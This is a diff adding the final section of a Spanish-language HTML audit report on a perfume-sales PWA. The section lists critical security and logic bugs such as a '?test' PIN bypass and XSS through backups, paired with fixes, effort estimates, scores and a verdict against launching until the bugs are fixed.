+      <div class="phase-subtitle">Top 20 problemas · Top 20 mejoras · Riesgos · Roadmap · Veredicto</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔴 Top 20 Problemas Encontrados</div>
+    <table>
+      <thead><tr><th>#</th><th>Problema</th><th>Tipo</th><th>Severidad</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>PIN bypass via <code>?test</code> en URL</td><td>Seguridad</td><td class="c-bad">CRÍTICO</td></tr>
+        <tr><td>2</td><td>XSS via <code>p.foto</code> sin escapeHTML en renderStock/renderCatalogo</td><td>Seguridad</td><td class="c-bad">CRÍTICO</td></tr>
+        <tr><td>3</td><td>XSS via <code>p.nombre</code> en toast() (vía backup malicioso)</td><td>Seguridad</td><td class="c-bad">CRÍTICO</td></tr>
+        <tr><td>4</td><td>KV namespace no configurado → rate limiting inactivo</td><td>Seguridad/Infra</td><td class="c-bad">CRÍTICO</td></tr>
+        <tr><td>5</td><td>onclick injection via variable <code>mes</code> sin escapar</td><td>Seguridad</td><td class="c-warn">ALTO</td></tr>
+        <tr><td>6</td><td>CDN scripts sin SRI hashes</td><td>Seguridad</td><td class="c-warn">ALTO</td></tr>
+        <tr><td>7</td><td>IndexedDB error silencioso → datos no guardados sin notificación</td><td>Funcionalidad</td><td class="c-warn">ALTO</td></tr>
+        <tr><td>8</td><td>Backup descarga timestamp falso si window.open es bloqueado</td><td>Confiabilidad</td><td class="c-warn">ALTO</td></tr>
+        <tr><td>9</td><td>_validarSchemaBackup rechaza backup con 0 ventas</td><td>Bug lógico</td><td class="c-bad">CRÍTICO*</td></tr>
+        <tr><td>10</td><td>Stock puede guardarse como valor negativo</td><td>Validación</td><td class="c-warn">ALTO</td></tr>
+        <tr><td>11</td><td>window.open() bloqueado en Safari iOS para WhatsApp</td><td>Funcionalidad</td><td class="c-warn">ALTO</td></tr>
+        <tr><td>12</td><td>Date.now() como ID — colisión posible en multi-tab</td><td>Bug lógico</td><td class="c-warn">ALTO</td></tr>
+        <tr><td>13</td><td>Nombre de perfume sin límite de longitud (500+ chars)</td><td>Validación</td><td class="c-warn">MEDIO</td></tr>
+        <tr><td>14</td><td>Cuotas sin límite máximo (acepta 999)</td><td>Validación</td><td class="c-warn">MEDIO</td></tr>
+        <tr><td>15</td><td>diasDesdeUltimoPago ignora zona horaria → ±1 día</td><td>Bug lógico</td><td class="c-warn">MEDIO</td></tr>
+        <tr><td>16</td><td>29/02 en año no bisiesto → parsea al mes siguiente silenciosamente</td><td>Bug lógico</td><td class="c-warn">MEDIO</td></tr>
+        <tr><td>17</td><td>exportarVentasCSV usa <code>v.precio</code> en lugar de <code>v.precioVenta</code></td><td>Bug de datos</td><td class="c-warn">MEDIO</td></tr>
+        <tr><td>18</td><td>Sin BroadcastChannel — 2 tabs del mismo perfil divergen en datos</td><td>Arquitectura</td><td class="c-warn">MEDIO</td></tr>
+        <tr><td>19</td><td>Monolito 7k líneas — imposible testear, mantener o colaborar</td><td>Arquitectura</td><td class="c-warn">ALTO</td></tr>
+        <tr><td>20</td><td>Sin feedback de error en renderMetaBar() si el DOM no cargó</td><td>Estabilidad</td><td class="c-ok">BAJO</td></tr>
+      </tbody>
+    </table>
+    <p style="font-size:11px;color:var(--text3);margin-top:8px">* El #9 es crítico para usuarios sin ventas (nuevas usuarias o backup de perfil vacío)</p>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">🟢 Top 20 Mejoras Recomendadas</div>
+    <table>
+      <thead><tr><th>#</th><th>Mejora</th><th>Esfuerzo</th><th>ROI</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>Eliminar línea PIN bypass (1 línea)</td><td class="c-ok">5 min</td><td class="c-bad">Crítico</td></tr>
+        <tr><td>2</td><td>escapeHTML en p.foto y toast(p.nombre)</td><td class="c-ok">20 min</td><td class="c-bad">Crítico</td></tr>
+        <tr><td>3</td><td>Configurar KV + R2 en Cloudflare</td><td class="c-ok">15 min</td><td class="c-bad">Crítico</td></tr>
+        <tr><td>4</td><td>Math.max(0, ...) en edit-stock</td><td class="c-ok">1 min</td><td class="c-warn">Alto</td></tr>
+        <tr><td>5</td><td>data-attribute para eliminarMes() en lugar de onclick inline</td><td class="c-ok">30 min</td><td class="c-warn">Alto</td></tr>
+        <tr><td>6</td><td>Toast cuando IDB falla al iniciarse</td><td class="c-ok">20 min</td><td class="c-warn">Alto</td></tr>
+        <tr><td>7</td><td>Remover validación "ventas.length === 0" en _validarSchemaBackup</td><td class="c-ok">2 min</td><td class="c-warn">Alto</td></tr>
+        <tr><td>8</td><td>SRI hashes en las 3 URLs de CDN</td><td class="c-ok">1 hora</td><td class="c-warn">Alto</td></tr>
+        <tr><td>9</td><td>Reemplazar window.open() con anchor.click() para WhatsApp</td><td class="c-ok">30 min</td><td class="c-warn">Alto</td></tr>
+        <tr><td>10</td><td>maxlength="100" en campos de texto de perfume/cliente</td><td class="c-ok">10 min</td><td class="c-warn">Medio</td></tr>
+        <tr><td>11</td><td>Límite max cuotas = 24 en validación addVenta()</td><td class="c-ok">5 min</td><td class="c-warn">Medio</td></tr>
+        <tr><td>12</td><td>Validar URL foto como https:// en previewFotoUrl()</td><td class="c-ok">15 min</td><td class="c-warn">Medio</td></tr>
+        <tr><td>13</td><td>crypto.randomUUID() en lugar de Date.now() para IDs</td><td class="c-ok">10 min</td><td class="c-warn">Medio</td></tr>
+        <tr><td>14</td><td>Corregir campo <code>v.precio</code> → <code>v.precioVenta</code> en exportarVentasCSV</td><td class="c-ok">2 min</td><td class="c-warn">Medio</td></tr>
+        <tr><td>15</td><td>width/height en &lt;img&gt; de app-screenshot en landing (fix CLS)</td><td class="c-ok">5 min</td><td class="c-ok">Bajo</td></tr>
+        <tr><td>16</td><td>role="dialog" + aria-modal en modales principales</td><td class="c-ok">1 hora</td><td class="c-ok">Medio</td></tr>
+        <tr><td>17</td><td>BroadcastChannel para sync entre tabs del mismo perfil</td><td class="c-warn">2 horas</td><td class="c-ok">Medio</td></tr>
+        <tr><td>18</td><td>Separar JavaScript del HTML (módulos ES)</td><td class="c-bad">1 semana</td><td class="c-bad">Crítico largo plazo</td></tr>
+        <tr><td>19</td><td>Tests E2E con Playwright para flujos críticos</td><td class="c-bad">2 días</td><td class="c-bad">Crítico largo plazo</td></tr>
+        <tr><td>20</td><td>Pago self-service (Stripe o MercadoPago)</td><td class="c-bad">1 semana</td><td class="c-bad">Crítico para negocio</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">Puntuaciones finales del equipo técnico</div>
+    <div style="background:var(--bg2);border-radius:var(--radius);overflow:hidden">
+      <div class="score-row">
+        <span class="score-name">Funcionalidad</span>
+        <div class="score-bar"><div class="score-fill" style="width:78%;background:linear-gradient(90deg,var(--gold),var(--gold2))"></div></div>
+        <span class="score-num" style="color:var(--gold2)">7.8</span>
+      </div>
+      <div class="score-row">
+        <span class="score-name">Seguridad</span>
+        <div class="score-bar"><div class="score-fill" style="width:48%;background:var(--orange)"></div></div>
+        <span class="score-num" style="color:var(--orange)">4.8</span>
+      </div>
+      <div class="score-row">
+        <span class="score-name">UX / UI</span>
+        <div class="score-bar"><div class="score-fill" style="width:78%;background:linear-gradient(90deg,var(--gold),var(--gold2))"></div></div>
+        <span class="score-num" style="color:var(--gold2)">7.8</span>
+      </div>
+      <div class="score-row">
+        <span class="score-name">Rendimiento</span>
+        <div class="score-bar"><div class="score-fill" style="width:72%;background:linear-gradient(90deg,var(--gold),var(--gold2))"></div></div>
+        <span class="score-num" style="color:var(--gold2)">7.2</span>
+      </div>
+      <div class="score-row">
+        <span class="score-name">Escalabilidad</span>
+        <div class="score-bar"><div class="score-fill" style="width:50%;background:var(--orange)"></div></div>
+        <span class="score-num" style="color:var(--orange)">5.0</span>
+      </div>
+      <div class="score-row">
+        <span class="score-name">Calidad de código</span>
+        <div class="score-bar"><div class="score-fill" style="width:58%;background:var(--yellow)"></div></div>
+        <span class="score-num" style="color:var(--yellow)">5.8</span>
+      </div>
+      <div class="score-row">
+        <span class="score-name">Preparación para producción</span>
+        <div class="score-bar"><div class="score-fill" style="width:52%;background:var(--orange)"></div></div>
+        <span class="score-num" style="color:var(--orange)">5.2</span>
+      </div>
+      <div class="score-row" style="background:rgba(224,80,80,0.08);border-top:2px solid var(--red)">
+        <span class="score-name" style="font-size:15px;font-weight:800;color:var(--text)">PROMEDIO TÉCNICO</span>
+        <div class="score-bar"><div class="score-fill" style="width:63%;background:var(--orange)"></div></div>
+        <span class="score-num" style="font-size:20px;color:var(--orange)">6.2</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">Veredicto del equipo técnico</div>
+
+    <div class="verdict">
+      <div class="verdict-q">¿Lanzarías esta aplicación hoy a 100.000 usuarios?</div>
+      <div class="verdict-a" style="color:var(--red)">🔴 NO — Hay 4 bugs críticos de seguridad que deben corregirse primero.</div>
+      <p style="color:var(--text2);font-size:13px;margin-top:8px">Un PIN que se puede saltar con <code>?test</code>, XSS via backup y rate limiting desactivado son bloqueantes absolutos para un lanzamiento masivo. Sin embargo, son todos corregibles en menos de 2 horas de trabajo.</p>
+    </div>
+
+    <div class="verdict">
+      <div class="verdict-q">¿Qué falta exactamente para ser un SÍ?</div>
+      <div class="verdict-a">Las 8 correcciones de seguridad de la Fase 4 + feedback de IDB + backup con 0 ventas. Estimado: <strong style="color:var(--green)">4-6 horas de trabajo</strong>.</div>
+    </div>
+
+    <div class="verdict">
+      <div class="verdict-q">¿Cuál es la principal debilidad técnica?</div>
+      <div class="verdict-a">El monolito de 7.009 líneas que imposibilita tests, debugging, colaboración y una CSP sólida.</div>
+    </div>
+
+    <div class="verdict">
+      <div class="verdict-q">¿Cuál es la principal fortaleza técnica?</div>
+      <div class="verdict-a" style="color:var(--green)">El producto FUNCIONA bien para su propósito. PWA offline-first con IndexedDB, virtual scroll, debounce, UX móvil sólida y HMAC-SHA256 para licencias son decisiones técnicas correctas.</div>
+    </div>
+
+    <div class="verdict">
+      <div class="verdict-q">¿Qué riesgo futuro más grande hay?</div>
+      <div class="verdict-a">La ausencia de sincronización multi-dispositivo. Las usuarias eventualmente van a querer usar la app en 2 celulares o cambiar de teléfono. La arquitectura local-first actual no lo soporta bien.</div>
+    </div>
+  </div>
+
+  <div class="callout danger" style="margin-top:20px;padding:20px 22px">
+    <span class="callout-icon" style="font-size:28px">🚨</span>
+    <div>
+      <strong style="font-size:16px;display:block;margin-bottom:8px">Acción inmediata — antes de cualquier campaña de marketing</strong>
+      <p style="color:var(--text2);line-height:1.7">Los bugs críticos #1, #2, #3 y #4 deben corregirse <strong style="color:var(--text)">hoy</strong>, antes de compartir la app con nuevas usuarias. Si alguien distribuye un backup malicioso en un grupo de WhatsApp de revendedoras, puede ejecutar código en los dispositivos de todas las que restauren ese archivo. Con la URL de la app pública, el PIN bypass es trivialmente explotable.</p>
+      <div style="margin-top:14px;display:flex;flex-wrap:wrap;gap:10px">
+        <span class="tag tag-crit">1. Eliminar ?test bypass (5 min)</span>
+        <span class="tag tag-crit">2. escapeHTML en p.foto (10 min)</span>
+        <span class="tag tag-crit">3. escapeHTML en toast(p.nombre) (20 min)</span>
+        <span class="tag tag-crit">4. Crear KV namespace (10 min)</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /page -->
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(a => {
+  a.addEventListener('click', e => {
+    const el = document.getElementById(a.getAttribute('href').slice(1));
+    if(el){ e.preventDefault(); el.scrollIntoView({behavior:'smooth',block:'start'}); }
+  });
+});
+</script>
+</body>
+</html>
